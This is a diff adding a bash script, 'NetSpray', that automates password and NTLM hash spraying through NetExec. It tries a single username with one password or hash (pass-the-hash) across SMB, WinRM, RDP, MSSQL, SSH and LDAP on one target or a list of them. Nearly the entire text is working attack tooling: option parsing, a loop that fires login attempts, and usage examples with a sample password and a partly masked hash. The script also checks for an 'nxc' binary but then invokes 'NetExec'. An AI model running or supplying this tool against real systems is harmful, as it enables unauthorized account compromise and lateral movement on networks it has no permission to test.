@@ -1,0 +1,182 @@
+#!/bin/bash
+#                           NetSpray v1.0                                      
+#            NetExec Password/Hash Spraying Automation Tool                   
+# Author: 0xmr
+# Purpose: Spray credentials across multiple protocols and targets
+# Usage: ./NetSpray <protocols|all> <targets> -u <user> [-p pass | -H hash]
+
+# HELP & USAGE
+show_usage() {
+    echo "Usage: $0 <protocols|all> <targets> -u <username> [-p <password> | -H <hash>] [OPTIONS]"
+    echo ""
+    echo "Required:"
+    echo "  protocols          Protocols to test: smb,ldap,winrm,rdp,mssql,ssh or 'all'"
+    echo "  targets            IP address, IP range, or file with targets (one per line)"
+    echo "  -u USERNAME        Username to spray"
+    echo ""
+    echo "Authentication (choose one):"
+    echo "  -p PASSWORD        Single password to spray"
+    echo "  -H HASH            NTLM hash for pass-the-hash"
+    echo ""
+    echo "Optional:"
+    echo "  --continue-on-success    Keep spraying after finding valid creds"
+    echo "  --no-bruteforce          Avoid bruteforce mode (safer, slower)"
+    echo ""
+    echo "Examples:"
+    echo "  NetSpray smb 10.10.10.10 -u admin -p P@ssword123!"
+    echo "  NetSpray all targets.txt -u admin -p   P@ssword123!"
+    echo "  NetSpray smb,winrm 192.168.1.10 -u admin -H aad3b435b51404ee:8846f7eaeexxxxx7ad06bdd830b7586c"
+    exit 0
+}
+
+#------ ARGUMENT VALIDATION
+
+# Show help if requested or no arguments
+if [[ "$1" == "-h" || "$1" == "--help" || "$#" -eq 0 ]]; then
+    show_usage
+fi
+
+# Need at least 4 arguments
+if [ "$#" -lt 4 ]; then
+    echo "[-] Error: Not enough arguments"
+    echo ""
+    show_usage
+fi
+
+#-------- PARSE ARGUMENTS
+
+# Positional arguments
+PROTOCOLS_INPUT="$1"
+TARGETS_INPUT="$2"
+shift 2
+
+# Initialize variables with defaults
+USERNAME=""
+PASSWORD=""
+HASH=""
+CONTINUE_FLAG=""
+NOBRUTE_FLAG=""
+
+# Parse optional flags
+while [[ $# -gt 0 ]]; do
+    case $1 in
+        -u)
+            USERNAME="$2"
+            shift 2
+            ;;
+        -p)
+            PASSWORD="$2"
+            shift 2
+            ;;
+        -H)
+            HASH="$2"
+            shift 2
+            ;;
+        --continue-on-success)
+            CONTINUE_FLAG="--continue-on-success"
+            shift
+            ;;
+        --no-bruteforce)
+            NOBRUTE_FLAG="--no-bruteforce"
+            shift
+            ;;
+        *)
+            echo "[-] Unknown option: $1"
+            show_usage
+            ;;
+    esac
+done
+
+#-------- VALIDATION CHECKS
+
+# Check username is provided
+if [ -z "$USERNAME" ]; then
+    echo "[-] Error: Username (-u) is required"
+    exit 1
+fi
+
+# Check at least one auth method provided
+if [ -z "$PASSWORD" ] && [ -z "$HASH" ]; then
+    echo "[-] Error: Must provide either -p (password) or -H (hash)"
+    exit 1
+fi
+
+# Check not using both password and hash
+if [ -n "$PASSWORD" ] && [ -n "$HASH" ]; then
+    echo "[-] Error: Cannot use both -p and -H together"
+    exit 1
+fi
+
+# Check if NetExec is installed
+if ! command -v nxc &> /dev/null; then
+    echo "[-] Error: NetExec (nxc) is not installed"
+    echo "[*] Install with: sudo apt install netexec -y"
+    exit 1
+fi
+
+#-------- PROTOCOL SETUP
+
+# Handle 'all' protocols or parse comma-separated list
+# Order: smb → winrm → rdp → mssql → ssh → ldap
+if [ "$PROTOCOLS_INPUT" = "all" ]; then
+    PROTOCOL_LIST=(smb winrm rdp mssql ssh ldap)
+else
+    IFS=',' read -ra PROTOCOL_LIST <<< "$PROTOCOLS_INPUT"
+fi
+
+#--------- TARGET SETUP
+
+# Check if targets is a file or single IP
+if [ -f "$TARGETS_INPUT" ]; then
+    mapfile -t TARGET_LIST < "$TARGETS_INPUT"
+else
+    TARGET_LIST=("$TARGETS_INPUT")
+fi
+
+#--------- DISPLAY CONFIGURATION
+echo "================================================"
+echo "           NetSpray v1.0"
+echo "                 by 0xmr"
+echo "        0xmrsecurity.github.io"
+echo "================================================"
+echo "[*] Protocols : ${PROTOCOL_LIST[@]}"
+echo "[*] Targets   : ${#TARGET_LIST[@]} target(s)"
+echo "[*] Username  : $USERNAME"
+
+if [ -n "$HASH" ]; then
+    echo "[*] Authentication: NTLM Hash"
+else
+    echo "[*] Authentication: Password"
+fi
+
+[ -n "$CONTINUE_FLAG" ] && echo "[*] Continue on success: Yes"
+[ -n "$NOBRUTE_FLAG" ] && echo "[*] No bruteforce mode: Yes"
+echo "================================================"
+echo ""
+
+#-------- MAIN SPRAYING LOOP
+for PROTOCOL in "${PROTOCOL_LIST[@]}"; do
+    echo "────────────────────────────────────────────────"
+    echo "[+] Spraying Protocol: $PROTOCOL"
+    echo "────────────────────────────────────────────────"
+    
+    for TARGET in "${TARGET_LIST[@]}"; do
+        # Skip empty lines
+        [ -z "$TARGET" ] && continue
+        
+        echo "  → Target: $TARGET"
+        # Run NetExec command directly (it handles its own timeout and output)
+        if [ -n "$HASH" ]; then
+            NetExec "$PROTOCOL" "$TARGET" -u "$USERNAME" -H "$HASH" $CONTINUE_FLAG $NOBRUTE_FLAG
+        else
+            NetExec "$PROTOCOL" "$TARGET" -u "$USERNAME" -p "$PASSWORD" $CONTINUE_FLAG $NOBRUTE_FLAG
+        fi
+        
+        echo ""
+    done
+    
+    echo ""
+done
+
+# FINAL 
+echo "[+] Spray Complete!"
